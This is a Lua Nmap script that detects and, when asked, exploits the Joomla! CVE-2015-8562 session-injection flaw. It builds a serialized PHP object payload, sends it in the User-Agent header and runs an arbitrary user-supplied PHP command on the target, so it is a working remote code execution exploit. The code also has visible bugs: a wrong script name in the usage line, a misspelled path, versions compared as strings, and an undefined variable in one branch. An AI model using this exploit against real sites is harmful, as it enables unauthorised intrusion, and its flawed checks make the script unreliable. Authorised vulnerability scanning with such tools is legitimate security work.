local http = require "http"
local shortport = require "shortport"
local slaxml = require "slaxml"
local stdnse = require "stdnse"
local string = require "string"
local strbuf = require "strbuf"
local vulns = require "vulns"

description = [[Joomla! has a an unauthenticated remote code execution vulnerability in all versions from 1.5.0 to 3.4.5
by using unsanitized User-Agent/HTTP_X_FORWARDED_FOR headers. PHP versions after 5.4.45 excluding 5.5.29 or 5.6.13
are not vulnerable as they check for invalid session data.
]]

---
-- @usage
-- nmap --script http-webdav-scan -p80,443 <target>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2015-8562:
-- |   VULNERABLE:
-- |   Joomla! remote code execution due to unsanitized HTTP headers
-- |     State: VULNERABLE
-- |     IDs:  BID:79195  CVE:CVE-2015-8562
-- |     Risk factor: High  CVSS2: 7.5
-- |       Joomla! suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5 due to
-- |       storage of unsanitized headers in session data.
-- |     Disclosure date: 2015-12-15
-- |     Exploit results:
-- |       Joomla! version 3.4.3. PHP Version 5.4.7.
-- |     References:
-- |       https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8562
-- |       http://www.securityfocus.com/bid/79195
-- |       https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html
-- |_      https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html
--
--
-- @args http-vuln-cve2015-8562.path The path to start in; eg, <code>"/web/"</code> will try <code>"/web/xxx"</code>.
-- @args http-vuln-cve2015-8562.exploit Exploit if version checking passes, tries 'phpinfo()' by default.
-- @args http-vuln-cve2015-8562.command The custom command to use instead of the default 'phpinfo()'
-- @args http-vuln-cve2015-8562.showoutput Shows the output of the exploit on the screen. The output maybe ugly depending on the command
-- executed. False by default.
-- @args http-vuln-cve2015-8562.override Proceed with checking via exploitation, bypassing the version checks.
--
-- @xmloutput
-- <elem key="title">Joomla! remote code execution due to unsanitized
-- HTTP headers</elem>
-- <elem key="state">VULNERABLE (Exploitable)</elem>
-- <table key="ids">
--   <elem>CVE:CVE-2015-8562</elem>
--   <elem>BID:79195</elem>
-- </table>
-- <table key="scores">
--   <elem key="CVSS2">7.5</elem>
-- </table>
-- <table key="description">
--   <elem>Joomla! suffers from an unauthenticated remote code
--   execution that affects all versions from 1.5.0 to 3.4.5 due to
--   storage of unsanitized headers in session data.</elem>
-- </table>
-- <table key="dates">
--   <table key="disclosure">
--     <elem key="day">15</elem>
--     <elem key="month">12</elem>
--     <elem key="year">2015</elem>
--   </table>
-- </table>
-- <elem key="disclosure">2015-12-15</elem>
-- <table key="exploit_results">
--   <elem>Joomla! version 3.4.3. PHP Version 5.4.7.</elem>
-- </table>
-- <table key="refs">
--   <elem>
--   https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html</elem>
--   <elem>
--   https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html</elem>
--   <elem>
--   https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html</elem>
--   <elem>http://www.securityfocus.com/bid/79195</elem>
--   <elem>
--   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8562</elem>
-- </table>
-----------------------------------------------------------------------

author = "Gyanendra Mishra"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {
  "default",
  "exploit",
  "intrusive",
  "vuln",
}


portrule = shortport.http

local function encode_payload(command)
  local encoded_command = strbuf.new()
  for i=1, #command do
    encoded_command = encoded_command .. "chr(" .. string.byte(command:sub(i,i)) .. ")."
  end
  return strbuf.dump(encoded_command):sub(1,-2)
end

local function get_payload(command)
  payload = "eval(" .. encode_payload(command) .. ")"
  terminate = '\xf0\xfd\xfd\xfd'
  exploit_template = [[}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";]]
  injected_payload = payload .. ";JFactory::getConfig();exit"
  exploit_template = exploit_template .. [[s:]]..injected_payload:len()..[[:"]] .. injected_payload ..[["]]
  exploit_template = exploit_template .. [[;s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}]]
  exploit_template = exploit_template .. terminate
  return exploit_template
end

function action (host, port)

  local path = stdnse.get_script_args(SCRIPT_NAME .. ".path") or "/"
  local exploit = stdnse.get_script_args(SCRIPT_NAME .. ".exploit") or false
  local command = stdnse.get_script_args(SCRIPT_NAME .. ".command") or "phpinfo();"
  local showoutput = stdnse.get_script_args(SCRIPT_NAME .. ".showoutput") or false
  local override = stdnse.get_script_args(SCRIPT_NAME .. ".override") or false
  local joomla_version = nil
  local php_version = nil
  -- override isn't set, let's check for the php versions.
  if not override then

    local response = http.get(host, port, path)
    if response and response.status ~= 200 then
      return nil
    end

    local is_php_vulnerable=false

    if not response.header['x-powered-by'] then
      stdnse.debug1('PHP info not in headers. Run the script with override set to true to confirm.')
      return nil
    else
      php_version =  string.match(response.header['x-powered-by'],'PHP%/([%d%.]+)')
      local ubuntu_version = string.match(response.header['x-powered-by'],'ubuntu([%d%.]+)') or false
      local is_deb = string.match(response.header['x-powered-by'],'deb') or false
      stdnse.debug1('PHP Version %s',response.header['x-powered-by'])
      if is_deb then
        if php_version > '5.4.45' then
          is_php_vulnerable=false
        --confirm the below check once
        elseif php_version > '5.4.45' and response.header['x-powered-by']:match('7[u%.]1') then
          is_php_vulnerable=false
        else
          is_php_vulnerable=true
        end
      elseif ubuntu_version then
        if php_version > '5.5.9' then
          is_php_vulnerable=false
        elseif php_version=='5.5.9' and ubuntu_version >= '4.13' then
          is_php_vulnerable=false
        elseif php_version=='5.3.10' and ubuntu_version >= '3.20' then
          is_php_vulnerable=false
        else
          is_php_vulnerable=true
        end
      elseif php_version < '5.5.0' then
        is_php_vulnerable=true
      elseif php_version>= '5.5.0' and php_version<='5.5.28' then
        is_php_vulnerable=true
      elseif php_version>= '5.6.0' and php_version<='5.6.12' then
        is_php_vulnerable=true
      end
    end


    if not is_php_vulnerable then
      stdnse.debug1('This version of PHP looks safe!')
      return nil
    end

    local paths = {'/', '/administartor/'}
    local joomla_and_online = false

    local normalized_path = nil
    for _, subpath in pairs(paths) do
      normalized_path = string.gsub(path .. subpath, "//", "/")
      response = http.get(host, port, normalized_path)
      if response and response.status==200 then
        if string.match(response.body, '<meta name="generator" content="Joomla!') then
          joomla_and_online = true
          break
        end
      end
    end

    if not joomla_and_online then
      stdnse.debug1("Joomla! was not found on target!")
      return nil
    end

    normalized_path = string.gsub(path .. 'administrator/manifests/files/joomla.xml', '//', '/')
    response = http.get(host, port, normalized_path)
    if response and response.status == 200 then
      local parser = slaxml.parser:new()
      parser._call = {startElement = function(name)
          if name =='version' then parser._call.text = function(content) joomla_version = content end end end,
          closeElement = function(name) parser._call.text = function() return nil end end
      }
      parser:parseSAX(response.body, {stripWhitespace=true})
    end
  end

  -- either we have a vulnerable version of joomla or override set to true.
  if override or joomla_version < '3.4.6' then
    stdnse.debug('Joomla! Version %s', joomla_version)
    local vuln_table = {
      title = "Joomla! remote code execution due to unsanitized HTTP headers",
      state = vulns.STATE.VULN,
      risk_factor = "High",
      references = {
        'https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html',
        'https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html',
        'https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html'
      },
      IDS = {
        CVE = 'CVE-2015-8562',
        BID = '79195'
      },
      scores = {
        CVSS2 =  '7.5'
      },
    dates = {
       disclosure = { year = 2015, month = 12, day = 15},
    },
      description = [[Joomla! suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5 due to
storage of unsanitized headers in session data.]],
      exploit_results = string.format('Joomla! version %s. PHP Version %s.', joomla_version, php_version)
    }

    -- one of exploit or override has to be true.
    if exploit or override then

      local options

      options = {header={}, no_cache=true, bypass_cache=true, redirect_ok=function(host,port)
          local c = 3
          return function(url)
            if ( c==0 ) then return false end
            c = c - 1
            return true
          end
      end }
      local left_pad = stdnse.generate_random_string(10,'abcdefghijklmnopqrstuvwxyz123456890')
      local right_pad = stdnse.generate_random_string(10, 'abcdefghijklmnopqrstuvwxyz123456890')
      command = 'echo("' .. left_pad .. '");' .. command .. 'echo("' .. right_pad ..'");'
        options['header']['User-Agent'] = get_payload(command)
        response = http.get(host, port, path, options)
        options['cookies'] = response.cookies
        response = http.get(host, port, path, options)
        -- a match was found
        if response.body:match(left_pad) and response.body:match(right_pad) then
        vuln_table.state = vulns.STATE.EXPLOIT
          -- the output of the command isn't required
          if not showoutput then
            local report = vulns.Report:new(SCRIPT_NAME, host, port)
            return report:make_output(vuln_table)
          else
            vuln_table.exploit_results = response.body:match(left_pad .. '(.+)' .. right_pad)
            local report = vulns.Report:new(SCRIPT_NAME, host, port)
            return report:make_output(vuln_table)
          end
        -- no match was found, maybe a patched old version.
        else
          vuln_table.state = vulns.STATE.NOT_VULN
          report:make_output(vuln_table)
        end
    -- exploit isn't set to true
    else
      local report = vulns.Report:new(SCRIPT_NAME, host, port)
      return report:make_output(vuln_table)
    end
  -- Not a vulnerable Joomla!
  else
    stdnse.debug1("Joomla! Looks Safe! Run with override set to true to be really sure.")
    return nil
  end
end
